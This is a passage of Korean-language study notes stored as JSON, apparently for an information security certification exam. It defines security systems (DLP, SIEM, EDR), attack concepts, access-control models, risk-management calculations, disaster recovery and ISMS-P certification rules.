**제공 서비스별 키 사용**\n  - 기밀성 : 세션키 암호화(수신자 공개키)\n  - 인증·부인방지 : 송신자 **개인키로 전자서명**\n  - 무결성 : 메시지 **해시(다이제스트)**\n- **S/MIME와 비교** : S/MIME은 **CA가 발급한 X.509 인증서** 기반(기업·표준), PGP는 **신뢰의 웹(Web of Trust)** 기반(개인 간 상호 서명)","added":false,"hasAdd":true}]},{"title":"보안 솔루션 · 체계","items":[{"title":"DLP (Data Loss Prevention)","star":false,"body":"- 기업 내부의 민감 데이터·지적재산·고객 개인정보 유출을 사전 방지하는 솔루션\n- 정보 흐름 모니터링 및 실시간 차단 기능 제공\n\n::보강::\n- **적용 지점(3계층)**\n  - **Endpoint DLP** : PC의 USB·출력·복사 등 단말 유출 통제\n  - **Network DLP** : 메일·웹·메신저 등 **전송 구간** 감시·차단\n  - **Storage DLP** : 서버·DB 등 **저장 데이터** 스캔(민감정보 위치 식별)\n- **탐지 방식** : 정규식·사전 패턴(주민번호·카드번호), 지문(Fingerprinting), 콘텐츠 분석\n- **DRM과 차이** : DLP는 **유출 경로 감시·차단** 중심, DRM은 문서 자체를 **암호화·권한 통제**해 반출돼도 열람 제한","added":false,"hasAdd":true},{"title":"ESM (Enterprise Security Management)","star":false,"body":"- **정의** : FW·WAF·IPS 등 이기종 보안 솔루션 로그를 통합 수집·분석·모니터링하는 통합보안관제 시스템 (로그 수집 / 저장·분석 / 전달·모니터링 3계층)\n- **구성요소**\n  - **Agent** : 보안 솔루션에 탑재되어 이벤트·경고 정보 전달\n  - **Manager** : 이벤트·Alert 로그 저장·분석 후 관리자에게 보고\n  - **Console** : 이벤트 로그 위험 분석 및 해킹 모니터링 수행","added":false},{"title":"SIEM (Security Information & Event Management)","star":true,"body":"- **개념** : 서버 및 보안 시스템으로부터 생성되는 **로그 데이터를 빅데이터 기법으로 분석**하는 **지능형 통합 분석 보안 시스템**\n- **기능** : 로그 **상관분석**, **포렌식** 기능 제공, 지능적 위협(APT)에 대한 **조기 경고 모니터링**\n- **ESM과의 차이** : ESM은 **실시간 이벤트 관제** 중심 / SIEM은 **장기간 대용량 로그 저장·상관분석** 중심","added":false},{"title":"SOAR","star":false,"body":"- 보안팀이 이기종 보안 도구를 **통합·조정(Orchestration)**하고 반복적인 대응 작업을 **자동화(Automation)**하는 체계\n- **발전 흐름** : ESM(관제) → SIEM(분석) → **SOAR(대응 자동화)**","added":false},{"title":"EDR (Endpoint Detection & Response)","star":false,"body":"- **엔드포인트**를 지속 모니터링하여 **행위 기반** 위협 탐지·분석·대응하는 솔루션 (APT 대응)\n- 기능 : 화이트리스트 기반 프로세스 관리, 취약점 스캔, USB 차단 등\n\n::보강::\n- **동작 흐름** : 엔드포인트 행위 데이터 **상시 수집 → 이상행위 탐지 → 자동 대응(격리·차단·롤백) → 원인 분석(포렌식)**\n- **기존 백신(AV)과 차이** : 백신은 **시그니처 기반 알려진 악성코드** 탐지 중심, EDR은 **행위·이상징후 기반**으로 **알려지지 않은 위협·APT** 탐지에 강함\n- **연계 개념** : XDR(엔드포인트+네트워크+클라우드 통합 탐지), MDR(관제 서비스형)","added":false,"hasAdd":true},{"title":"TMS (Threat Management System) / TI","star":false,"body":"- **TMS** : 전사 IT 인프라의 위협 정보를 수집·분석·경보·관리하는 통합관리 시스템. 대외 정보보호기관의 위협정보를 실시간 수집하여 예·경보 체계 구축\n- **TI (Threat Intelligence)** : 수집된 위협 정보를 분석하여 **선제적으로 대응**하는 전략·방법론. SIEM에서 위협 식별 후 TI/TMS에 질의하여 공격 주체 식별 가능","added":false},{"title":"사이버 킬 체인 (Cyber Kill Chain) / MITRE ATT&CK","star":true,"body":"- **사이버 킬 체인** : APT 등 침투·정보유출 공격 단계를 모델화한 방어 프레임워크 (Lockheed Martin)\n  - **7단계** : 정찰 → 무기화 → 전달 → 익스플로잇 → 설치 → 명령·제어(C2) → 목표 달성\n- **MITRE ATT&CK** : 사이버 킬 체인의 7단계를 확장하여 공격 전술·기법을 **14단계**로 체계화한 모델","added":false},{"title":"악성코드·공격 분석 도구 및 평가 기준","star":true,"body":"- **YARA** : VirusTotal 제작. 악성코드의 특성·행위 **패턴(룰)**으로 악성코드를 분류하는 도구\n- **Pass the Hash** : mimikatz 등으로 메모리의 **NTLM/LanMan 해시를 탈취**하여 (평문 없이) 원격 서버 인증을 시도하는 공격\n- **DDE (Dynamic Data Exchange)** : MS Office와 애플리케이션 간 데이터 전달 프로토콜. 엑셀 등에서 활성화 시 **매크로 없이도** 외부 명령(cmd) 실행에 악용 가능\n- **CVSS (Common Vulnerability Scoring System)** : 취약점의 공격 난이도·피해 규모를 점수화하는 기준 → **패치 우선순위** 결정\n  - 관련 : **CVE**(취약점 식별번호), **CWE**(취약점 유형 분류), **CCE**(보안 설정 오류 분류)","added":false}]},{"title":"기타 핵심 개념","items":[{"title":"정보보안 거버넌스","star":false,"body":"- 정보의 무결성·서비스 연속성·자산 보호를 위한 것으로, **기업 거버넌스의 부분집합**. 전략적 방향 제시, 위험관리, 자산의 책임 있는 사용, 보안 프로그램의 성공·실패 모니터링을 보장하는 **상위 레벨의 평가·지시·모니터링 체계**","added":false},{"title":"접근통제 보안 모델 (BLP / Biba)","star":true,"body":"- **BLP (벨-라파둘라)** : **기밀성** 중심의 강제적 접근제어 모델\n  - **No Read Up (ss-property)** : 낮은 등급 주체는 높은 등급 객체를 **읽을 수 없음**\n  - **No Write Down (\\*-property)** : 높은 등급 주체는 낮은 등급 객체에 **쓸 수 없음** → 상위 정보가 하위로 흐르는 경로 차단(기밀성 보장)\n- **Biba** : **무결성** 중심 모델\n  - **No Read Down / No Write Up** : 낮은 무결성 객체를 읽거나, 높은 무결성 객체에 쓰지 못하게 하여 무결성 보장","added":false},{"title":"제로 데이 공격 (Zero Day Attack)","star":false,"body":"- 프로그램의 취약점이 **알려지지 않아 패치가 나오지 않은 시점**에 해당 취약점을 이용해 이루어지는 공격\n\n::보강::\n- **명칭 유래** : 패치가 배포되기까지 방어자에게 주어진 시간이 **0일(Zero Day)**이라는 의미\n- **위험성** : 시그니처 미존재로 백신·IDS가 탐지 못함. 다크웹에서 **익스플로잇이 고가에 거래**되기도 함\n- **대응** : 취약점이 알려지지 않아도 막을 수 있도록 **행위 기반 탐지(EDR)**, **가상패치(WAF)**, 신속한 패치 관리(패치 배포 후 즉시 적용), 최소 권한·네트워크 분리로 **피해 확산 최소화**","added":false,"hasAdd":true},{"title":"디지털 포렌식 (Digital Forensic)","star":true,"body":"- **개념** : 디지털 매체 범죄의 **법적 증거 확보**를 위한 수집·분석·보존 절차\n- **5대 원칙 (정재신연무)**\n  - **정당성** : 적법한 절차로 수집된 증거여야 함 (위법 수집 증거는 효력 없음)\n  - **재현성** : 동일 조건에서 동일 결과가 나와야 함\n  - **신속성** : 휘발성 정보 확보를 위해 신속히 대응\n  - **연계보관성(Chain of Custody)** : 수집→이동→분석→보관→제출 각 단계의 담당자·책임 명확화\n  - **무결성** : 수집 증거가 위·변조되지 않고 원본과 동일함을 증명(예: 해시값)\n- **절차** : 수사 준비 → 증거물 획득 → 보관·이송 → 분석·조사 → 보고서 작성","added":false}]}]},{"num":5,"title":"정보보안 관리 및 법규","sections":[{"title":"위험관리 — 개념","items":[{"title":"위험의 구성 요소","star":false,"body":"- **자산 (Assets)** : 위험을 보유한 대상이자 조직이 보호해야 할 대상\n  - 정보·하드웨어·소프트웨어·시설 등 + **관련 인력, 기업 이미지 등 무형 자산 포함**\n  - 위험 발생 시 **피해 규모 측정에 반드시 포함**되는 요소\n- **위협 (Threats)** : 외부에서 발생하여 자산에 손실을 초래할 수 있는, 원치 않는 사건의 **잠재적 원인·행위자**\n- **취약점 (Vulnerability)** : 자산의 잠재적 속성으로, **위협의 이용 대상이 되는 내재된 약점**. 위협이 이를 활용하여 위험이 발생","added":false},{"title":"위험 관리 구성 요소","star":false,"body":"- **정보보호 대책(통제)** : 위험을 억제·허용 수준으로 낮추기 위한 관리적·물리적·기술적 대책\n- **잔여 위험(Residual Risk)** : 대책 적용 후에도 기술적 한계·비용 문제로 남아있는 위험. 지속 모니터링 필요\n- **수용 가능 목표 위험 수준(DoA)** : 조직이 현실적으로 감당 가능한 최대 위험 수준. 최고 경영진이 공식 승인한 한계선","added":false},{"title":"정보 자산 중요도 등급","star":false,"body":"- **높음** : 특별히 허가받은 사람만 열람, 외부 공개 시 치명적 피해\n- **중간** : 내부 공개 가능하나 외부 공개 시 문제 발생 가능\n- **낮음** : 외부 공개되어도 영향 미미","added":false}]},{"title":"위험관리 — 절차 · 방법","items":[{"title":"위험 관리 단계","star":false,"body":"- **위험 관리** : 자산의 위험을 감수 가능한 수준으로 유지하기 위해 위험을 분석하고 보호 대책을 마련하는 과정\n- **위험 분석** : 취약성을 식별하고 발생 가능성·영향을 파악하여 위험 정도 결정\n- **위험 평가** : 수용 가능 목표 수준(DoA)을 초과하는 위험을 식별·감소시키기 위해 위험처리 전략 선택","added":false},{"title":"위험 관리 6단계","star":true,"body":"1. **위험 관리 전략 및 계획 수립** (범위·조직·방법론 결정)\n2. **위험 분석** — 자산·위협·취약점을 분석하여 위험의 정도를 산정\n3. **위험 평가** — DoA 초과 위험을 식별하고 처리 우선순위 결정\n4. **정보보호 대책 선정** — 위험 처리 전략에 따른 통제 선택\n5. **정보보호 계획 수립** — 대책의 적용 주체·일정·방법 수립\n6. **실행** (= 정보보호 대책 **구현 및 운영**)","added":false},{"title":"위험분석 절차 / 정보자산 분석","star":false,"body":"1. **자산 식별** : 보호 대상 정보자산을 체계적으로 파악·정리 (위험 분석의 기초)\n2. **자산 가치평가(중요도 산정)** : **기밀성·무결성·가용성(CIA)** 관점의 중요도 분석 → 자산 가치 평가\n   - 정량적 : 영향도·점수 수치화 / 정성적 : 낮음·보통·높음 등급 부여\n   - 자산 **중요도(등급)**는 보안 통제 우선순위를 정하는 **Baseline**이 됨\n3. **자산 그룹핑** : 유형·중요도가 유사한 자산을 묶어 중복 분석 방지, 시간·비용 절감\n4. **위협 및 발생 가능성 평가** : 위협 요소 식별, 발생 빈도·노출 수준으로 발생 가능성 수치화","added":false},{"title":"ISO/IEC 위험 구성요소 관계도","star":true,"body":"- **위협 증가 → 위험 증가**, **자산 증가 → 위험 증가**, **취약성 증가 → 노출 증가**\n- **보안대책 → 위험 감소** (보안대책은 위험을 낮추는 유일한 감소 요인)","added":false},{"title":"위험 분석 접근법","star":false,"body":"- **기준선 접근법(Baseline)** : 체크리스트상 보안 대책 구현 여부 판단 → 미구현 항목 구현\n- **비정형 접근법(Informal)** : 구조적 방법론 없이 경험자 지식에 의존, 중요 위험 중심\n- **상세 위험 분석(Detailed)** : 자산·위협·취약성 분석을 정립된 모델로 상세 수행 (고위험 대상)\n- **통합 접근법(Combined)** : 고위험은 상세 분석, 그 외는 기준선 적용 (가장 비용 효율적, 권장)","added":false},{"title":"위험 분석 방법론 (정량적 / 정성적)","star":true,"body":"> ※ 위의 '접근법(기준선·비정형·상세·통합)'과 혼동 주의 — 이쪽은 **분석 결과를 표현하는 방식**의 구분\n- **정량적 분석** : 위험을 **금액·수치**로 산정\n  - 과거 자료 분석법, 수학 공식 접근법, 확률 분포법, 점수법 등\n- **정성적 분석** : 위험을 **등급·서술**로 표현\n  - **델파이법** : 전문가 집단을 구성하여 위협·취약성에 관한 **토론(반복적 의견 수렴)**을 통해 위험을 분석\n    - 장점: 짧은 시간에 도출 가능 / 단점: 추정이 **주관적**\n  - **시나리오법** : 어떤 사건도 기대대로 발생하지 않는다는 전제 하에, 일정 조건에서 발생 가능한 **결과들을 추정**\n  - **순위 결정법** : 비교 우위 순위결정표에 따라 위험 항목의 **서술적 순위**를 결정\n  - 질문서법 등","added":false},{"title":"ISO 31000 / ISO 27005 위험평가 절차","star":true,"body":"- **공통 3단계**\n  1. **위험 식별(Risk Identification)** : 자산·위협·현 통제·취약점을 식별하여 잠재적 손해 근원 파악\n  2. **위험 분석(Risk Analysis)** : 시나리오별 영향·발생 가능성을 객관적·주관적으로 분석하여 심각도 평가\n  3. **위험 수준 평가(Risk Evaluation)** : 조직 기준과 비교하여 수용 여부·처리 **우선순위** 결정\n- ISO 27005는 정보보안 위험관리 국제표준으로 위 절차를 따름","added":false},{"title":"위험 처리 방식 (4가지)","star":true,"body":"- **위험 수용** : 위험 정도가 수용 가능하다고 판단하고 프로세스를 그대로 유지\n- **위험 완화(감소)** : 대책을 채택·구현하여 위험을 허용 수준으로 낮춤\n- **위험 전가** : 경제적 손실·책임을 제3자에게 이전 (예: **보험 가입, 외주 위탁**)\n- **위험 회피** : 위험이 있는 프로세스·사업을 축소하거나 포기","added":false},{"title":"정량적 위험 평가 계산 (SLE / ALE)","star":true,"body":"- **SLE (단일 손실 예상액)** = **AV(자산가치) × EF(노출계수)**\n- **ALE (연간 손실 예상액)** = **SLE × ARO(연간 발생률)**\n- **정보보호 대책의 효과(가치)** = **감소한 ALE(적용 전 ALE − 적용 후 ALE) − 대책 운영 비용**\n  - 값이 클수록(+) 효과적 → 여러 대책 중 **효과 값이 큰 대책 선정**\n- 예: 감소 ALE 30,000 − 운영비 17,000 = 효과 13,000 / 감소 ALE 20,000 − 운영비 4,000 = 효과 16,000 → **후자 선정**","added":false},{"title":"위험 관리 계획","star":false,"body":"- 발생 가능한 위험을 사전 식별·평가한 후 대응 방안·실행 절차를 수립하는 종합 계획\n- 포함 내용 : 선택된 통제의 목적·방안·선택 이유, 통제를 누가·언제·어디서·어떻게 적용할지","added":false},{"title":"GAP 분석 (차이 분석)","star":false,"body":"- **정의** : 현재 보안 수준(As-Is)과 목표/기준 보안 수준(To-Be) 사이의 **차이(Gap)를 식별**하여 개선 과제를 도출하는 분석 기법\n- **활용** : ISMS-P 인증 기준·법적 요구사항 대비 현황 점검, 이행 로드맵 수립","added":true}]},{"title":"재해복구 (DRS)","items":[{"title":"재해복구시스템 유형","star":false,"body":"| 유형 | 개념 | 복구 시간 | 비용 |\n|---|---|---|---|\n| **미러 사이트** | 주 센터와 동일 시스템 구축, **실시간 동기화** | 즉시 (거의 0) | 가장 높음 |\n| **핫 사이트** | 동일 수준 시스템을 Stand-by로 원격지에 보유, 실시간~수시간 동기화 | 수 시간 이내 | 높음 |\n| **웜 사이트** | 중요 자원만 부분 보유 | 수일~수주 | 중간 |\n| **콜드 사이트** | 공간·전원 등 기반 시설만 확보, 데이터·시스템은 재해 시 구축 | 수주~수개월 | 가장 낮음 |\n\n> 미러/핫 사이트는 데이터 손실이 적으나 데이터 오염 시 동시 오염 위험이 있음.","added":false},{"title":"BCP (업무연속성계획) / BIA","star":true,"body":"- **BCP (Business Continuity Plan)** : 재해·장애로 업무가 중단되어도 **비즈니스 연속성을 보장**하기 위한 계획\n- **BIA (Business Impact Analysis, 업무영향도 분석)** : BCP의 **핵심 절차**. 업무 중단 시 재무적 손실·규제 요건 등을 고려해 업무 중요도를 평가하고 **RTO·RPO를 결정**\n  - **RTO(목표 복구 시간)** : 얼마나 빨리 복구할 것인가\n  - **RPO(목표 복구 시점)** : 어느 시점의 데이터까지 복구할 것인가","added":false}]},{"title":"관리체계 · 인증","items":[{"title":"ISMS-P 인증기준 3영역","star":false,"body":"- 관리체계 수립 및 운영\n- 보호대책 요구사항\n- 개인정보 처리 단계별 요구사항\n\n::보강::\n- **영역별 항목 수 (총 101개 인증기준)** ★\n  1. **관리체계 수립 및 운영** (16개) : 관리체계 기반 마련, 위험관리, 운영, 점검·개선 — **PDCA 순환 구조**\n  2. **보호대책 요구사항** (64개) : 정책·조직·자산관리, 인적·물리·기술적 보호대책 등 12개 분야\n  3. **개인정보 처리단계별 요구사항** (21개) : 수집→보유·이용→제공→파기, 정보주체 권리보장\n- **인증 구분** : **ISMS**(1+2영역, 80개) / **ISMS-P**(1+2+3영역, 101개, 개인정보 포함)","added":false,"hasAdd":true},{"title":"ISMS-P 물리적 정보보호 대책 (7가지)","star":false,"body":"- 보호구역 지정 / 출입 통제 / 정보시스템 보호 / 보호 설비 운영 / 보호구역 내 작업 / 반·출입 기기 통제 / 업무 환경 보안","added":false},{"title":"ISMS-P 인증 평가 항목 (위험관리 관련)","star":true,"body":"- **1.2.1 정보자산 식별** : 자산 분류 기준 수립, 범위 내 모든 자산 식별·분류하고 **중요도**를 산정하여 목록을 최신 관리\n- **1.2.3 위험평가** : 유형별 **위협 정보**를 수집, 적합한 위험 평가 방법을 선정하여 **연 1회 이상** 위험 평가, 수용 가능 위험은 **경영진** 승인을 받아 관리","added":false},{"title":"ISMS-P 인증 체계 (기관)","star":true,"body":"- **방송통신위원회(+ 과기정통부·행안부)** : 정책 협의회 구성, 법·제도 개선, 인증기관·심사기관 **지정**\n- **KISA** : 인증서 **발급**, 인증심사원 양성·자격 관리\n- **인증위원회** : 인증심사 결과 **심의·의결**","added":false},{"title":"CC 인증 (Common Criteria)","star":false,"body":"- 정보보호 제품의 보안성을 평가·인증하는 **국제 표준(ISO/IEC 15408)**\n\n::보강::\n- **평가 구성요소**\n  - **PP(Protection Profile)** : 제품군별 공통 보안요구사항 명세(수요자 관점)\n  - **ST(Security Target)** : 특정 제품의 보안 명세(개발자 관점)\n  - **TOE(Target Of Evaluation)** : 평가 대상 제품\n- **보증등급** : **EAL1 ~ EAL7** (숫자가 높을수록 엄격한 검증 → 높은 신뢰)\n- **상호인정** : **CCRA** 협정으로 회원국 간 인증 결과를 상호 인정","added":false,"hasAdd":true},{"title":"침해대응 기관 (ISAC vs CERT)","star":true,"body":"- **ISAC (정보공유분석센터)** : 금융·통신 등 **분야별 기반시설** 보호를 위해 실시간 경보·분석 체계를 운영하는 기관\n- **CERT** : 침해사고 **사전 예방** 및 발생 시 조직적·체계적 **긴급 대응·복구**가 주목적","added":false},{"title":"사이버 위기 경보 단계","star":true,"body":"- **정상 → 관심 → 주의 → 경계 → 심각** (5단계)","added":false},{"title":"침해사고 대응 7단계","star":true,"body":"- 사고 전 준비 → 사고 탐지 → **초기 대응** → 대응 전략 체계화 → 사고 조사 → 보고서 작성 → 해결(복구)\n\n::보강::\n- **단계별 핵심 활동**\n  1. **사고 전 준비** : 대응팀·절차·연락체계 구축, 로그·백업 체계 마련\n  2. **사고 탐지** : IDS·로그·신고로 이상 징후 인지\n  3. **초기 대응** : 사고 범위 파악, 초동 조치, 관련자 통보\n  4. **대응 전략 체계화** : 대응 방향(격리·차단·보존) 결정\n  5. **사고 조사** : 원인·경로·피해 규모 분석(**포렌식**, 증거 보존)\n  6. **보고서 작성** : 경과·원인·대응·재발방지 문서화\n  7. **해결(복구)** : 시스템 정상화, 재발방지 대책 적용\n- **증거 확보 원칙** : 휘발성이 높은 것부터 수집(레지스터·메모리→디스크), **무결성(해시)·연계보관성(Chain of Custody)** 유지","added":false,"hasAdd":true},{"title":"ISMS 인증 의무 대상자","star":true,"body":"- **정의** : 정보통신망법에 따라 ISMS 인증을 **의무적으로** 받아야 하는 사업자\n- **주요 대상 (하나라도 해당 시)**\n  - **ISP** : 전기통신사업자(회선설비 보유)\n  - **IDC** : 집적정보통신시설 사업자\n  - **매출·이용자 기준** : 정보통신서비스 부문 전년도 매출 **100억 원 이상**, 또는 전년도 말 기준 직전 3개월간 일평균 이용자 **100만 명 이상**\n  - 연간 매출 **1,500억 원 이상**인 상급종합병원·재학생 1만 명 이상 대학 등\n- **인증 유효기간** : **3년** (매년 사후심사, 3년마다 갱신심사)","added":true}]},{"title":"개인정보보호 · 법규","items":[{"title":"개인정보 영향평가 (PIA)","star":false,"body":"- **수행 시 고려 사항**\n  1. 처리하는
